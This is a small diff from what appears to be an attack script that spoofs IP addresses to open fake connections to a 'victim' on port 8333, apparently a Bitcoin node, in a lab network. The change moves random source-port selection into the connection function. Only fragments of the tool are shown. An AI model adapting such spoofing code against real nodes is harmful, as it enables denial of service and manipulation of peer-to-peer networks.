@@ -22,7 +22,6 @@ victim_ip = '10.0.2.4'
 victim_port = 8333
 
 attacker_ip = '10.0.2.15'
-attacker_port = random.randint(1024, 65535)
 
 spoof_IP_interface = []
 spoof_IP_and_ports = []
@@ -103,7 +102,7 @@ def get_mac_address(ifname):
     return ':'.join('%02x' % b for b in info[18:24])
 
 def initialize_fake_connection(src_ip, dst_ip):
-	src_port = attacker_port
+	src_port = random.randint(1024, 65535)
 	dst_port = victim_port
 	print(f'Spoofing with IP ({src_ip} : {src_port}) to IP ({dst_ip} : {dst_port})...')
 
